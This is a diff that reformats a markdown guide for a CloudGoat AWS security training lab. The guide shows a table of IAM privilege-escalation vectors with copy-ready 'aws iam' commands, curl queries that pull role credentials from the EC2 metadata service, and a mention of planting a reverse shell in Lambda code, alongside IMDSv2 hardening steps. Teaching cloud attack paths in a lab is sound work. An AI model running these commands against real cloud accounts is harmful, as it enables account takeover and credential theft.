@@ -46,29 +46,29 @@ python3 cloudgoat.py list
 
 Based on Spencer Gieting's seminal Rhino Security Labs research, IAM policies with specific combinations of administrative permissions allow an attacker to escalate privileges to full `AdministratorAccess`:
 
-| # | Escalation Vector / Action | Prerequisites & Technique | Exploit Command / Mechanism |
-|---|----------------------------|---------------------------|-----------------------------|
-| **1** | `iam:CreateAccessKey` | Allowed on arbitrary users | `aws iam create-access-key --user-name target-admin` |
-| **2** | `iam:CreateLoginProfile` | User has no console password | `aws iam create-login-profile --user-name target-admin --password 'NewPassword!123'` |
-| **3** | `iam:UpdateLoginProfile` | User already has console password | `aws iam update-login-profile --user-name target-admin --password 'NewPassword!123'` |
-| **4** | `iam:AttachUserPolicy` | Can attach managed policies to self | `aws iam attach-user-policy --user-name self --policy-arn arn:aws:iam::aws:policy/AdministratorAccess` |
-| **5** | `iam:AttachGroupPolicy` | Can attach managed policies to group | `aws iam attach-group-policy --group-name mygroup --policy-arn arn:aws:iam::aws:policy/AdministratorAccess` |
-| **6** | `iam:AttachRolePolicy` | Can attach policies to role you assume | `aws iam attach-role-policy --role-name myrole --policy-arn arn:aws:iam::aws:policy/AdministratorAccess` |
-| **7** | `iam:PutUserPolicy` | Inline policy creation on user | `aws iam put-user-policy --user-name self --policy-name privesc --policy-document file://admin.json` |
-| **8** | `iam:PutGroupPolicy` | Inline policy creation on group | `aws iam put-group-policy --group-name mygroup --policy-name privesc --policy-document file://admin.json` |
-| **9** | `iam:PutRolePolicy` | Inline policy creation on role | `aws iam put-role-policy --role-name myrole --policy-name privesc --policy-document file://admin.json` |
-| **10** | `iam:AddUserToGroup` | Group has higher permissions | `aws iam add-user-to-group --group-name admins --user-name self` |
-| **11** | `iam:SetDefaultPolicyVersion` | Existing policy has older admin versions | `aws iam set-default-policy-version --policy-arn <arn> --version-id v2` |
-| **12** | `iam:CreatePolicyVersion` | Can create new version of existing policy | `aws iam create-policy-version --policy-arn <arn> --policy-document file://admin.json --set-as-default` |
-| **13** | `iam:UpdateAssumeRolePolicy` | Can edit Trust Relationship of role | Add self ARN to `Principal` in trust policy, then `sts:AssumeRole` |
-| **14** | `iam:PassRole` + `ec2:RunInstances` | Can launch EC2 with admin instance profile | Launch EC2 instance with admin IAM role; query metadata for STS credentials |
-| **15** | `iam:PassRole` + `lambda:CreateFunction` + `lambda:InvokeFunction` | Pass admin role to Lambda | Create Lambda with Python script executing admin tasks, then invoke |
-| **16** | `lambda:UpdateFunctionCode` | Existing Lambda has admin role | Overwrite existing Lambda code with reverse shell or privilege escalation script |
-| **17** | `iam:PassRole` + `glue:CreateDevEndpoint` | Pass admin role to AWS Glue | Create dev endpoint with admin role; SSH into endpoint or run script |
-| **18** | `iam:PassRole` + `cloudformation:CreateStack` | Pass admin role to CloudFormation | Deploy template containing resources that grant admin access |
-| **19** | `iam:PassRole` + `datapipeline:CreatePipeline` | Pass admin role to Data Pipeline | Create pipeline with `ShellCommandActivity` running admin CLI commands |
-| **20** | `iam:PassRole` + `codebuild:CreateProject` | Pass admin role to CodeBuild | Create build spec running malicious commands under admin role |
-| **21** | `sts:AssumeRole` | Target role trust policy allows caller | `aws sts assume-role --role-arn arn:aws:iam::123:role/Admin --role-session-name test` |
+| #      | Escalation Vector / Action                                         | Prerequisites & Technique                  | Exploit Command / Mechanism                                                                                 |
+| ------ | ------------------------------------------------------------------ | ------------------------------------------ | ----------------------------------------------------------------------------------------------------------- |
+| **1**  | `iam:CreateAccessKey`                                              | Allowed on arbitrary users                 | `aws iam create-access-key --user-name target-admin`                                                        |
+| **2**  | `iam:CreateLoginProfile`                                           | User has no console password               | `aws iam create-login-profile --user-name target-admin --password 'NewPassword!123'`                        |
+| **3**  | `iam:UpdateLoginProfile`                                           | User already has console password          | `aws iam update-login-profile --user-name target-admin --password 'NewPassword!123'`                        |
+| **4**  | `iam:AttachUserPolicy`                                             | Can attach managed policies to self        | `aws iam attach-user-policy --user-name self --policy-arn arn:aws:iam::aws:policy/AdministratorAccess`      |
+| **5**  | `iam:AttachGroupPolicy`                                            | Can attach managed policies to group       | `aws iam attach-group-policy --group-name mygroup --policy-arn arn:aws:iam::aws:policy/AdministratorAccess` |
+| **6**  | `iam:AttachRolePolicy`                                             | Can attach policies to role you assume     | `aws iam attach-role-policy --role-name myrole --policy-arn arn:aws:iam::aws:policy/AdministratorAccess`    |
+| **7**  | `iam:PutUserPolicy`                                                | Inline policy creation on user             | `aws iam put-user-policy --user-name self --policy-name privesc --policy-document file://admin.json`        |
+| **8**  | `iam:PutGroupPolicy`                                               | Inline policy creation on group            | `aws iam put-group-policy --group-name mygroup --policy-name privesc --policy-document file://admin.json`   |
+| **9**  | `iam:PutRolePolicy`                                                | Inline policy creation on role             | `aws iam put-role-policy --role-name myrole --policy-name privesc --policy-document file://admin.json`      |
+| **10** | `iam:AddUserToGroup`                                               | Group has higher permissions               | `aws iam add-user-to-group --group-name admins --user-name self`                                            |
+| **11** | `iam:SetDefaultPolicyVersion`                                      | Existing policy has older admin versions   | `aws iam set-default-policy-version --policy-arn <arn> --version-id v2`                                     |
+| **12** | `iam:CreatePolicyVersion`                                          | Can create new version of existing policy  | `aws iam create-policy-version --policy-arn <arn> --policy-document file://admin.json --set-as-default`     |
+| **13** | `iam:UpdateAssumeRolePolicy`                                       | Can edit Trust Relationship of role        | Add self ARN to `Principal` in trust policy, then `sts:AssumeRole`                                          |
+| **14** | `iam:PassRole` + `ec2:RunInstances`                                | Can launch EC2 with admin instance profile | Launch EC2 instance with admin IAM role; query metadata for STS credentials                                 |
+| **15** | `iam:PassRole` + `lambda:CreateFunction` + `lambda:InvokeFunction` | Pass admin role to Lambda                  | Create Lambda with Python script executing admin tasks, then invoke                                         |
+| **16** | `lambda:UpdateFunctionCode`                                        | Existing Lambda has admin role             | Overwrite existing Lambda code with reverse shell or privilege escalation script                            |
+| **17** | `iam:PassRole` + `glue:CreateDevEndpoint`                          | Pass admin role to AWS Glue                | Create dev endpoint with admin role; SSH into endpoint or run script                                        |
+| **18** | `iam:PassRole` + `cloudformation:CreateStack`                      | Pass admin role to CloudFormation          | Deploy template containing resources that grant admin access                                                |
+| **19** | `iam:PassRole` + `datapipeline:CreatePipeline`                     | Pass admin role to Data Pipeline           | Create pipeline with `ShellCommandActivity` running admin CLI commands                                      |
+| **20** | `iam:PassRole` + `codebuild:CreateProject`                         | Pass admin role to CodeBuild               | Create build spec running malicious commands under admin role                                               |
+| **21** | `sts:AssumeRole`                                                   | Target role trust policy allows caller     | `aws sts assume-role --role-arn arn:aws:iam::123:role/Admin --role-session-name test`                       |
 
 ---
 
@@ -92,7 +92,9 @@ The **Instance Metadata Service (IMDS)** provides configuration and temporary ST
 ```
 
 ### IMDSv1 (Legacy & Vulnerable to Simple SSRF)
+
 IMDSv1 uses connectionless HTTP `GET` requests without headers or authentication:
+
 ```bash
 # Extract the attached IAM role name
 curl http://169.254.169.254/latest/meta-data/iam/security-credentials/
@@ -100,10 +102,13 @@ curl http://169.254.169.254/latest/meta-data/iam/security-credentials/
 # Steal temporary AWS credentials
 curl http://169.254.169.254/latest/meta-data/iam/security-credentials/<ROLE_NAME>
 ```
-*Vulnerability*: Any basic SSRF or open proxy vulnerability in an application can immediately query this endpoint and exfiltrate credentials.
+
+_Vulnerability_: Any basic SSRF or open proxy vulnerability in an application can immediately query this endpoint and exfiltrate credentials.
 
 ### IMDSv2 (Session-Oriented Defense)
+
 IMDSv2 requires requesting a session token via an `HTTP PUT` request with a mandatory header, defeating standard simple SSRF and blind proxies:
+
 ```bash
 # Step 1: Request token (valid for 6 hours)
 TOKEN=$(curl -s -X PUT "http://169.254.169.254/latest/api/token" \
@@ -115,6 +120,7 @@ curl -s -H "X-aws-ec2-metadata-token: $TOKEN" \
 ```
 
 ### Hardening & Remediation
+
 1. **Require IMDSv2**:
    ```bash
    aws ec2 modify-instance-metadata-options \
@@ -161,17 +167,19 @@ When an IAM identity has `lambda:UpdateFunctionCode` or `lambda:CreateFunction` 
 
 ## Popular CloudGoat Scenarios
 
-| Scenario | Objective | Key Vulnerabilities Explored |
-|----------|-----------|------------------------------|
-| **`cloud_breach_s3`** | Exfiltrate private S3 data | EC2 SSRF, IMDSv1 credential theft, S3 bucket policy misconfiguration |
-| **`vulnerable_lambda`** | Escalate to administrator | IAM privesc, Lambda SQLi, code modification |
-| **`iam_privesc_by_rollback`** | Elevate IAM permissions | Policy versioning, reverting to default administrative version |
-| **`iam_privesc_by_attachment`** | Elevate IAM permissions | Overprivileged attachment rights on managed policies |
-| **`ec2_ssrf`** | Pivot from web to internal cloud | SSRF, reverse proxy routing, IMDS credential harvesting |
-| **`sns_secrets`** | Discover confidential database keys | Public SNS topics, HTTP subscription endpoints |
+| Scenario                        | Objective                           | Key Vulnerabilities Explored                                         |
+| ------------------------------- | ----------------------------------- | -------------------------------------------------------------------- |
+| **`cloud_breach_s3`**           | Exfiltrate private S3 data          | EC2 SSRF, IMDSv1 credential theft, S3 bucket policy misconfiguration |
+| **`vulnerable_lambda`**         | Escalate to administrator           | IAM privesc, Lambda SQLi, code modification                          |
+| **`iam_privesc_by_rollback`**   | Elevate IAM permissions             | Policy versioning, reverting to default administrative version       |
+| **`iam_privesc_by_attachment`** | Elevate IAM permissions             | Overprivileged attachment rights on managed policies                 |
+| **`ec2_ssrf`**                  | Pivot from web to internal cloud    | SSRF, reverse proxy routing, IMDS credential harvesting              |
+| **`sns_secrets`**               | Discover confidential database keys | Public SNS topics, HTTP subscription endpoints                       |
 
 ### Deploying a Scenario
+
 Inside the container:
+
 ```bash
 # Deploy cloud_breach_s3
 python3 cloudgoat.py create cloud_breach_s3
@@ -198,7 +206,9 @@ All video links have been verified active via YouTube oEmbed API:
 ---
 
 ## Quick CLI Control
+
 From the `cyber_lab` root directory:
+
 ```bash
 # Check status
 ./lab status
